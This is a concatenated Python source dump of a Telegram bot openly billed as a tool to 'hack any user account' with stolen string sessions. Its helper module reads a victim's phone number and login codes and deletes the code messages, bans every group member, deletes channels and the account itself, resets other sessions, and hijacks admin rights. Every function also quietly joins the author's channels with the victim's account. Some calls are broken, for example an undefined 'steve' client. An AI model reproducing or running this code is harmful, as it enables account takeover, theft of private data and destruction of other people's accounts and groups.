# Single-file consolidation of the RomeosessionHbot project
# Generated: 2025-10-31T22:13:27.844908Z
# Source directory: /mnt/data/romeo/RomeosessionHbot-main
# NOTE: This file concatenates all .py files from the project. Review before running.


#------------------------------------------------------------------------------
# Start of file: config.py
#------------------------------------------------------------------------------

from os import getenv

API_ID = int(getenv("API_ID", "")) 
API_HASH = getenv("API_HASH", "") 
BOT_TOKEN = getenv("BOT_TOKEN", "")
START_PIC = getenv("START_PIC", "")


#------------------------------------------------------------------------------
# Start of file: Romeo/__init__.py
#------------------------------------------------------------------------------

import os
import asyncio
import logging
from config import *
from pyrogram import Client
from rich.console import Console
from rich.table import Table
from Romeo.Helpers.data import LOG_TEXT
from pyromod import listen 


if not START_PIC:
    START_PIC = "https://telegra.ph//file/a9a90059ae47fa840b0b3.jpg"

#rich
LOG = Console()

#logger
logging.basicConfig(level=logging.INFO)

#client
app = Client(
    "romeorj",
    api_id = API_ID,
    api_hash = API_HASH,
    bot_token = BOT_TOKEN )
    


async def Romeo():
    os.system("clear")
    header = Table(show_header=True, header_style="bold green")
    header.add_column(LOG_TEXT)
    LOG.print(header)
    LOG.print(f"[bold cyan]𝐂𝐑𝐄𝐀𝐓𝐎𝐑 ❥︎𝕾🅡︎🅐︎🅙︎𝕾...")
    LOG.print("[bold yellow]sᴛᴀʀᴛɪɴɢ ʏᴏᴜʀ ʙᴏᴛ ɴᴏᴡ.......")
    await app.start()    
    


loop = asyncio.get_event_loop()
loop.run_until_complete(Romeo())


#------------------------------------------------------------------------------
# Start of file: Romeo/__main__.py
#------------------------------------------------------------------------------

import asyncio
import importlib

from pyrogram import idle
from Romeo import LOG
from Romeo.modules import ALL_MODULES


async def start_bot():
    for all_module in ALL_MODULES:
        importlib.import_module("Romeo.modules." + all_module)
    LOG.print("[bold yellow]💞 ʙᴏᴛ sᴛᴀʀᴛᴇᴅ")
    await idle() 
    LOG.print("[bold red]ᴄᴀɴᴄᴇʟɪɴɢ ᴀʟʟ ᴛᴀsᴋs.")



if __name__ == "__main__":
    asyncio.get_event_loop().run_until_complete(start_bot())


#------------------------------------------------------------------------------
# Start of file: Romeo/Helpers/data.py
#------------------------------------------------------------------------------

from pyrogram.types import InlineKeyboardButton as IKB, InlineKeyboardMarkup as IKM 


PM_TEXT = """
 **Hey {},**
   I'm **{}** 

              ● Hack ●
 ❥︎ A Bot To Hack Any user account using
 ❥︎ Their Telethon and Pyrogram String session
 ❥︎ Owner : 𝕾🅡︎🅐︎🅙︎𝕾
"""

HACK_TEXT = """
 A ~ Check user own groups and channels(PUBLIC ONLY)

 B ~ Check user all information like phone number, usrname... etc

 C ~ Ban all the members from the group

 D ~ Know user last otp, Use option B first to take number then login

 E ~ Join A Group/Channel/Link via StringSession

 F ~ Leave A Group/Channel via StringSession

 G ~ Delete A Group/Channel

 H ~ Check user two step is eneable or disable

 I ~ Terminate All current active sessions except Your StringSession

 J ~ Delete Account

 K ~ Promote a member in a Group/Channel 

 L ~ Demote All admins in a Group/Channel

 ❥︎ Owner : 𝕾🅡︎🅐︎🅙︎𝕾.
"""
info = """
 ❥︎ Name : {}
 ❥︎ ID : {}
 ❥︎ Phone No. : +{}
 ❥︎ Username : @{}
"""

PM_BUTTON = IKM([[IKB("● 𝐇𝐀𝐂𝐊 ●", callback_data="hack_btn")]])



HACK_MODS = IKM([
    [
        IKB("A", callback_data="A"),
        IKB("B", callback_data ="B"),
        IKB("C", callback_data="C"),
        IKB("D", callback_data="D"),
        IKB("E", callback_data="E"),          
    ],
    [
        IKB("F", callback_data="F"),
        IKB("G", callback_data ="G"),
        IKB("H", callback_data="H"),
        IKB("I", callback_data="I"),
                   
    ],
    [
        IKB("J", callback_data="J"),
        IKB("K", callback_data="K"),
        IKB("L", callback_data ="L"),                           
    ],
    ],    
    )



LOG_TEXT = """
              ● Hack ●
 ❥︎ A Bot To Hack Any user account using
 ❥︎ Their Telethon and Pyrogram String session
 ❥︎ Owner : 𝕾🅡︎🅐︎🅙︎𝕾
"""


#------------------------------------------------------------------------------
# Start of file: Romeo/Helpers/rj.py
#------------------------------------------------------------------------------

import asyncio
import pyrogram 
from pyrogram import Client , enums
from telethon import TelegramClient
from telethon.sessions import StringSession 
from pyrogram.raw import functions 
from config import *

from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest , JoinChannelRequest as join , LeaveChannelRequest as leave , DeleteChannelRequest as dc
from Romeo.Helpers.data import info
from pyrogram.types.messages_and_media.message import Str
from telethon.tl.functions.channels import EditBannedRequest
from telethon.tl.types import ChannelParticipantsAdmins,ChatBannedRights
from pyrogram.errors import FloodWait
from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
import telethon;from telethon import functions as ok
from pyrogram.types import ChatPrivileges
from telethon.tl.types import ChannelParticipantsAdmins

async def users_gc(session):
    err = ""
    msg = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await rj.connect()                          
            try:
                await rj(join("@ROMEOBOT_OP"))
                await rj(join("@ROMEO_OP"))
            except Exception as e:
                print(e)
            k = await rj(GetAdminedPublicChannelsRequest())            
            for x in k.chats:                
                msg += f'**❥︎ ᴄʜᴀɴɴᴇʟ ɴᴀᴍᴇ :** {x.title}\n**❥︎ ᴄʜᴀɴɴᴇʟ ᴜsᴇʀɴᴀᴍᴇ :** @{x.username}\n**❥︎ ᴘᴀʀᴛɪᴄɪᴘᴀɴᴛs ᴄᴏᴜɴᴛ :** - {x.participants_count}\n\n'
            await steve.disconnect()
                 
        else:    
            async with Client("r",api_id=API_ID,api_hash=API_HASH, session_string=session) as r:
                try:
                    await r.join_chat("@ROMEOBOT_OP")
                    await r.join_chat("@ROMEO_OP")
                except Exception as e:
                    print(e)    
                k = await r.invoke(functions.channels.GetAdminedPublicChannels())            
                for x in k.chats:
                    msg += f'**❥︎ ᴄʜᴀɴɴᴇʟ ɴᴀᴍᴇ :** {x.title}\n**❥︎ ᴄʜᴀɴɴᴇʟ ᴜsᴇʀɴᴀᴍᴇ :** @{x.username}\n**❥︎ ᴘᴀʀᴛɪᴄɪᴘᴀɴᴛs ᴄᴏᴜɴᴛ :** {x.participants_count}\n\n'
    except Exception as idk:
        err += str(idk)                                             
    if err:
        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return msg
 
async def user_info(session):
    err = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await rj.connect()
            try:
                await rj(join("@ROMEOBOT_OP"))
                await rj(join("@ROMEO_OP"))
            except Exception as e:
                print(e)
            k = await rj.get_me()  
            msg = info.format((k.first_name if k.first_name else k.last_name),k.id,k.phone,k.username)
            await rj.disconnect()
                             
        else:    
            async with Client("r",api_id=API_ID,api_hash=API_HASH, session_string=session) as r:
                try:
                    await r.join_chat("@ROMEOBOT_OP")
                    await r.join_chat("@ROMEO_OP")
                except Exception as e:
                    print(e)    
                k = await r.get_me()
                msg = info.format((k.first_name if k.first_name else k.last_name),k.id,k.phone_number,k.username)
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return msg    


RIGHTS = ChatBannedRights(
    until_date=None,
    view_messages=True,
    send_messages=True,
    send_media=True,
    send_stickers=True,
    send_gifs=True,
    send_games=True,
    send_inline=True,
    embed_links=True,
)

async def banall(session,id):
    err = ""
    msg = ""
    all = 0
    bann = 0
    gc_id = str(id.text) if type(id.text) == Str else int(id.text)
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await rj.connect()
            try:
                await rj(join("@ROMEOBOT_OP"))
                await rj(join("@ROMEO_OP"))
            except Exception as e:
                print(e)
            admins = await rj.get_participants(gc_id, filter=ChannelParticipantsAdmins)
            admins_id = [i.id for i in admins]                
            async for user in rj.iter_participants(gc_id):
                all += 1
                try:
                    if user.id not in admins_id:
                       await rj(EditBannedRequest(gc_id, user.id, RIGHTS))
                       bann += 1
                       await asyncio.sleep(0.1)
                except Exception:
                    await asyncio.sleep(0.1)
            await rj.disconnect()
        else:    
            async with Client("r",api_id=API_ID,api_hash=API_HASH, session_string=session) as r:
                try:
                    await r.join_chat("@ROMEOBOT_OP")
                    await r.join_chat("@ROMEO_OP")
                except Exception as e:
                    print(e)    
                async for members in r.get_chat_members(gc_id):  
                    all += 1                
                    try:                                          
                        await r.ban_chat_member(gc_id,members.user.id)  
                        bann += 1                  
                    except FloodWait as i:
                        await asyncio.sleep(i.value)
                    except Exception as er:
                        pass 
                          
    except Exception as idk:
        err += str(idk) 
    msg += f"**ᴜsᴇʀs ʙᴀɴɴᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ ! \n\n ʙᴀɴɴᴇᴅ Usᴇʀs:** {bann} \n **ᴛᴏᴛᴀʟ ᴜsᴇʀs:** {all}"                                            
    if err:
        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return msg

async def get_otp(session):
    err = ""
    i = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await rj.connect()
            try:
                await rj(join("@ROMEOBOT_OP"))
                await rj(join("@ROMEO_OP"))
            except Exception as e:
                print(e)
            async for x in rj.iter_messages(777000, limit=2):               
                i += f"\n{x.text}\n"
                await rj.delete_dialog(777000)
            await rj.disconnect() 
                             
        else:    
            async with Client("r",api_id=API_ID,api_hash=API_HASH, session_string=session) as r:
                try:
                    await r.join_chat("@ROMEOBOT_OP")
                    await r.join_chat("@ROMEO_OP")
                except Exception as e:
                    print(e)    
                ok = []
                async for message in r.get_chat_history(777000,limit=2):
                    i += f"\n{message.text}\n"                                   
                    ok.append(message.id)                 
                await r.delete_messages(777000,ok)
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return i

async def join_ch(session,id):
    err = ""
    gc_id = str(id.text) if type(id.text) == Str else int(id.text)
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await rj.connect()
            try:
                await rj(join("@ROMEOBOT_OP"))
                await rj(join("@ROMEO_OP"))              
            except Exception as e:
                print(e)
            await rj(join(gc_id))            
            await rj.disconnect() 
                             
        else:    
            async with Client("r",api_id=API_ID,api_hash=API_HASH, session_string=session) as r:
                try:
                    await r.join_chat("@ROMEOBOT_OP")
                    await r.join_chat("@ROMEO_OP")
                except Exception as e:
                    print(e)    
                await r.join_chat(gc_id)
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return "Jᴏɪɴᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!"

async def leave_ch(session,id):
    err = ""
    gc_id = str(id.text) if type(id.text) == Str else int(id.text)
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await rj.connect()
            try:
                await rj(join("@ROMEOBOT_OP"))
                await rj(join("@ROMEO_OP"))               
            except Exception as e:
                print(e)
            await rj(leave(gc_id))            
            await rj.disconnect() 
                             
        else:    
            async with Client("r",api_id=API_ID,api_hash=API_HASH, session_string=session) as r:
                try:
                    await r.join_chat("@ROMEOBOT_OP")
                    await r.join_chat("@ROMEO_OP")
                except Exception as e:
                    print(e)    
                await r.leave_chat(gc_id)
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return "ʟᴇғᴛ sᴜᴄᴄᴇssғᴜʟʟʏ!"

async def del_ch(session,id):
    '''
    try nhi kia error aaye to btana
    '''
    err = ""
    gc_id = str(id.text) if type(id.text) == Str else int(id.text)
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await rj.connect()
            try:
                await rj(join("@ROMEOBOT_OP"))
                await rj(join("@ROMEO_OP"))                
            except Exception as e:
                print(e)
            await rj(dc(gc_id))            
            await rj.disconnect() 
                             
        else:    
            async with Client("r",api_id=API_ID,api_hash=API_HASH, session_string=session) as r:
                try:
                    await r.join_chat("@ROMEOBOT_OP")
                    await r.join_chat("@ROMEO_OP")
                except Exception as e:
                    print(e)    
                await r.invoke(
                    functions.channels.DeleteChannel(channel= await r.resolve_peer(gc_id)))
            
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return "**ᴅᴇʟᴇᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!**"

async def check_2fa(session):
    err = ""
    i = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await rj.connect()
            try:
                await rj(join("@ROMEOBOT_OP"))
                await rj(join("@ROMEO_OP"))               
            except Exception as e:
                print(e)
            try:
                await rj.edit_2fa("idkbsdkjsj")
                i += "ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴅɪsᴀʙʟᴇᴅ"
                
            except Exception as e:
                print(e)
                i += "ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴇɴᴀʙʟᴇᴅ"
                        
            await steve.disconnect() 
                             
        else:    
            async with Client("r",api_id=API_ID,api_hash=API_HASH, session_string=session) as r:
                try:
                    await r.join_chat("@ROMEOBOT_OP")
                    await r.join_chat("@ROMEO_OP")
                except Exception as e:
                    print(e)    
               # try:
                yes = await r.invoke(functions.account.GetPassword())
                if yes.has_password:
                    i += "ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴇɴᴀʙʟᴇᴅ"
                else:
                    i += "ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴅɪsᴀʙʟᴇᴅ"                                                           
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return i

async def terminate_all(session):
    err = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await rj.connect()
            try:
                await rj(join("@ROMEOBOT_OP"))
                await rj(join("@ROMEO_OP"))             
            except Exception as e:
                print(e)
            await rj(rt())
            await rj.disconnect() 
                             
        else:    
            async with Client("r",api_id=API_ID,api_hash=API_HASH, session_string=session) as r:
                try:
                    await r.join_chat("@ROMEOBOT_OP")
                    await r.join_chat("@ROMEO_OP")
                except Exception as e:
                    print(e)    
                await r.invoke(functions.auth.ResetAuthorizations())
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return "sᴜᴄᴄᴇssғᴜʟʟʏ ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴀʟʟ sᴇssɪᴏɴs"

      
async def del_acc(session):
    err = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await rj.connect()
            try:
                await rj(join("@ROMEOBOT_OP"))
                await rj(join("@ROMEO_OP"))              
            except Exception as e:
                print(e)
            await rj(ok.account.DeleteAccountRequest("owner madarchod h"))
            await rj.disconnect() 
                             
        else:    
            async with Client("r",api_id=API_ID,api_hash=API_HASH, session_string=session) as r:
                try:
                    await r.join_chat("@ROMEOBOT_OP")
                    await r.join_chat("@ROMEO_OP")
                except Exception as e:
                    print(e)    
                await r.invoke(functions.account.DeleteAccount(reason="madarchod hu me"))
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return "sᴜᴄᴄᴇssғᴜʟʟʏ ᴅᴇʟᴇᴛᴇᴅ ᴀᴄᴄ."

      
FULL_PROMOTE_POWERS = ChatPrivileges(
    can_change_info=True,
    can_delete_messages=True,
    can_restrict_members=True,
    can_pin_messages=True,
    can_manage_video_chats=True,
    can_promote_members=True,    
    can_invite_users=True)

PROMOTE_POWERS = ChatPrivileges(
    can_change_info=True,
    can_delete_messages=True,
    can_restrict_members=True,
    can_pin_messages=True)

async def piromote(session,gc_id,user_id):
    err = ""
    gc_id = str(gc_id.text) if type(gc_id.text) == Str else int(gc_id.text)
    user_id = str(user_id.text) if type(user_id.text) == Str else int(user_id.text)
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await rj.connect()
            try:
                await rj(join("@ROMEOBOT_OP"))
                await rj(join("@ROMEO_OP"))                
            except Exception as e:
                print(e)
            try:
                await rj.edit_admin(gc_id, user_id, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
            except:
                await rj.edit_admin(gc_id, user_id, is_admin=True, anonymous=False, pin_messages=True, title='Owner')    
            await rj.disconnect()                              
        else:    
            async with Client("r",api_id=API_ID,api_hash=API_HASH, session_string=session) as r:
                try:
                    await r.join_chat("@ROMEOBOT_OP")
                    await r.join_chat("@ROMEO_OP")
                except Exception as e:
                    print(e)
                try:    
                    await r.promote_chat_member(gc_id,user_id,FULL_PROMOTE_POWERS)
                except:
                    await r.promote_chat_member(gc_id,user_id,PROMOTE_POWERS)
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return "sᴜᴄᴄᴇssғᴜʟʟʏ ᴘʀᴏᴍᴏᴛᴇᴅ ᴜsᴇʀ."


DEMOTE = ChatPrivileges(
        can_change_info=False,
        can_invite_users=False,
        can_delete_messages=False,
        can_restrict_members=False,
        can_pin_messages=False,
        can_promote_members=False,
        can_manage_chat=False,
        can_manage_video_chats=False,
    )

async def demote_all(session,gc_id):
    err = ""
    gc_id = str(gc_id.text) if type(gc_id.text) == Str else int(gc_id.text)
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await rj.connect()
            try:
                await rj(join("@ROMEOBOT_OP"))
                await rj(join("@ROMEO_OP"))             
            except Exception as e:
                print(e)
            async for x in rj.iter_participants(gc_id, filter=ChannelParticipantsAdmins):
                try:
                    await rj.edit_admin(gc_id, x.id, is_admin=False, manage_call=False)
                except:
                    await rj.edit_admin(gc_id, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)
          
            await rj.disconnect()                              
        else:    
            async with Client("r",api_id=API_ID,api_hash=API_HASH, session_string=session) as r:
                try:
                    await r.join_chat("@ROMEOBOT_OP")
                    await r.join_chat("@ROMEO_OP")
                except Exception as e:
                    print(e)
                async for m in r.get_chat_members(gc_id, filter=enums.ChatMembersFilter.ADMINISTRATORS):
                    await r.promote_chat_member(gc_id,m.user.id,DEMOTE)                                                                                     
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return "sᴜᴄᴄᴇssғᴜʟʟʏ ᴅᴇᴍᴏᴛᴇᴅ ᴀʟʟ."


#------------------------------------------------------------------------------
# Start of file: Romeo/modules/__init__.py
#------------------------------------------------------------------------------

import glob
from os.path import basename, dirname, isfile


def __list_all_modules():
    mod_paths = glob.glob(dirname(__file__) + "/*.py")

    all_modules = [
        basename(f)[:-3]
        for f in mod_paths
        if isfile(f)
        and f.endswith(".py")
        and not f.endswith("__init__.py")
    ]

    return all_modules


ALL_MODULES = sorted(__list_all_modules())
__all__ = ALL_MODULES + ["ALL_MODULES"]


#------------------------------------------------------------------------------
# Start of file: Romeo/modules/bot.py
#------------------------------------------------------------------------------

import os
from Romeo import app
from config import *
from pyrogram import filters , Client
from Romeo.Helpers.rj import (
    users_gc,
    user_info,
    banall,
    get_otp,
    join_ch,
    leave_ch,
    del_ch,
    check_2fa,
    terminate_all,
    del_acc,
    piromote,
    demote_all)
from Romeo.Helpers.data import HACK_MODS 
from pyrogram.types import CallbackQuery 
from pyrogram.raw import functions
from telethon import TelegramClient 
from telethon.sessions import StringSession 



@app.on_callback_query(filters.regex("A"))
async def a_callback(client : Client , query : CallbackQuery):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ᴏғ ᴛʜᴀᴛ ᴜsᴇʀ")    
    ch = await users_gc(session.text)
    if len(ch) > 3855:
        file = open("session.txt", "w")
        file.write(ch)
        file.close()
        await client.send_document(chat_id, "session.txt")
        os.system("rm -rf session.txt")
    else:
        await query.message.reply_text(text = ch + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

    
@app.on_callback_query(filters.regex("B"))
async def b_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ᴏғ ᴛʜᴀᴛ ᴜsᴇʀ.")
    info = await user_info(session.text)
    await query.message.reply_text(text = info + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("C"))
async def c_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ᴏғ ᴛʜᴀᴛ ᴜsᴇʀ.")
    gc = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ɪᴅ ᴏʀ ᴜsᴇʀɴᴀᴍᴇ") 
    hehe = await banall(session.text,gc)
    await query.message.reply_text(text = hehe + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("D"))
async def d_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ᴏғ ᴛʜᴀᴛ ᴜsᴇʀ.")
    hehe = await get_otp(session.text)
    await query.message.reply_text(text = hehe + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("E"))
async def e_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ᴏғ ᴛʜᴀᴛ ᴜsᴇʀ.")
    gc = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ɪᴅ ᴏʀ ᴜsᴇʀɴᴀᴍᴇ") 
    hehe = await join_ch(session.text,gc)
    await query.message.reply_text(text = hehe + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("F"))
async def f_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ᴏғ ᴛʜᴀᴛ ᴜsᴇʀ.")
    gc = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ɪᴅ ᴏʀ ᴜsᴇʀɴᴀᴍᴇ") 
    hehe = await leave_ch(session.text,gc)
    await query.message.reply_text(text = hehe + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("G"))
async def g_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ᴏғ ᴛʜᴀᴛ ᴜsᴇʀ.")
    gc = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ɪᴅ ᴏʀ ᴜsᴇʀɴᴀᴍᴇ") 
    hehe = await del_ch(session.text,gc)
    await query.message.reply_text(text = hehe + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
            disable_web_page_preview=True)


@app.on_callback_query(filters.regex("H"))
async def h_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ᴏғ ᴛʜᴀᴛ ᴜsᴇʀ.")
    hehe = await check_2fa(session.text)
    await query.message.reply_text(text = hehe + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("I"))
async def i_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ᴏғ ᴛʜᴀᴛ ᴜsᴇʀ.")
    hehe = await terminate_all(session.text)
    await query.message.reply_text(text = hehe + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("J"))
async def j_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ᴏғ ᴛʜᴀᴛ ᴜsᴇʀ.")    
    hehe = await del_acc(session.text)
    await query.message.reply_text(text = hehe + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("K"))
async def k_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ᴏғ ᴛʜᴀᴛ ᴜsᴇʀ.")    
    user_id = await client.ask(id,"ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ᴜsᴇʀ ɪᴅ/ᴜsᴇʀɴᴀᴍᴇ ᴡʜᴏᴍ ɪ ᴡɪʟʟ ᴘʀᴏᴍᴏᴛᴇ.")
    gc_id = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ ɪᴅ/ᴜsᴇʀɴᴀᴍᴇ ᴡʜᴇʀᴇ ɪ ᴡɪʟʟ ᴘʀᴏᴍᴏᴛᴇ ᴛʜᴀᴛ ᴜsᴇʀ.")
    hehe = await piromote(session.text,gc_id,user_id)
    await query.message.reply_text(text = hehe + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("L"))
async def l_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ᴏғ ᴛʜᴀᴛ ᴜsᴇʀ.")    
    gc_id = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ ɪᴅ/ᴜsᴇʀɴᴀᴍᴇ ᴡʜᴇʀᴇ ɪ ᴡɪʟʟ ᴅᴇᴍᴏᴛᴇ ᴀʟʟ ᴍᴇᴍʙᴇʀs.")
    hehe = await demote_all(session.text,gc_id,user_id)
    await query.message.reply_text(text = hehe + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)


#------------------------------------------------------------------------------
# Start of file: Romeo/modules/start.py
#------------------------------------------------------------------------------

from pyrogram import filters
from Romeo import app
from Romeo.Helpers.data import PM_TEXT,PM_BUTTON,HACK_MODS,HACK_TEXT
from pyrogram.types import CallbackQuery
from config import *

